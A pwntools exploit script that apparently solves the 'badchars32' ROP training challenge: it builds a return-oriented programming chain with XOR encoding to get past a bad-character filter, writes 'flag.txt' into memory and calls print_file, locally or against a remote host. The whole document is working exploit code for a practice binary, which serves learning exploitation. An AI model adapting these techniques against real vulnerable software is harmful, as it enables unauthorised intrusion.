#!/usr/bin/python3
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)
    p.sendlineafter('> ', payload)
    
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './badchars32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

offset = 44 # find_ip(cyclic(100))

io = start()

# Note that these are all @plt addresses
# Obtained via gdb: info functions
print_file = 0x080483d0

# Gadgets
pop_esi_edi_ebp = 0x080485b9
mov_edi_esi = 0x0804854f
pop_ebx = 0x0804839d        # Note that bl is the last bytes of ebx
pop_ebp = 0x080485bb
xor_ebp_bl = 0x08048547

data_section = 0x0804a018 + 0x2

xored_flag = xor("flag.txt", 4)

unxored = b""
data_offset = 0
for b in xored_flag:
    unxored += pack(pop_ebx)                
    unxored += pack(4)
    unxored += pack(pop_ebp)
    unxored += pack(data_section + data_offset) 
    unxored += pack(xor_ebp_bl)                 
    data_offset += 1

payload = flat({
	offset: [
        pop_esi_edi_ebp,
        xored_flag[0:4],
        data_section,
        0x0,
        mov_edi_esi,
        pop_esi_edi_ebp,
        xored_flag[4:8],
        data_section + 0x4,
        0x0,
        mov_edi_esi,
        unxored,
        print_file,
        0x0,
        data_section
    ]
})

io.sendlineafter("> ", payload)
io.recvlineS()
flag = io.recvlineS()
log.success(flag)
